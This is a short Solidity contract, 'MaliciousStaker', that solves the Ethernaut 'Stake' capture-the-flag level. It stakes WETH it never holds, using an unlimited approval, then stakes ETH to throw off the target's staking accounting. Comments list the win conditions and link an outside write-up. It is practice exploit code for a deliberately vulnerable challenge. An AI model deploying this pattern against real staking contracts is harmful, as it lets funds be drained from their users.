// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// stake:   0x6318e691A50F0E574923369766943035de7afA48
// weth:    0xCd8AF4A0F29cF7966C051542905F66F5dca9052f
interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract MaliciousStaker {
    Stake private immutable i_stake;
    IWETH private i_weth;

    uint256 private defaultStake = 0.001 ether + 1 wei;

    constructor(Stake _stake, IWETH _weth) payable {
        require(msg.value >= defaultStake, "Not enough eth sent");
        i_stake = _stake;
        i_weth = _weth;
    }

    function pwn() external {
        stakeWETH();
        stakeETH();
    }

    function stakeWETH() private {
        i_weth.approve(address(i_stake), type(uint256).max);
        i_stake.StakeWETH(defaultStake);
    }

    function stakeETH() private {
        i_stake.StakeETH{value: defaultStake}();
    }
}

// The Stake contract's ETH balance has to be greater than 0.
// totalStaked must be greater than the Stake contract's ETH balance.
// You must be a staker.
// Your staked balance must be 0.

// solution:  https://medium.com/@vinicaboy/ethernaut-stake-challenge-5ff3331c0208
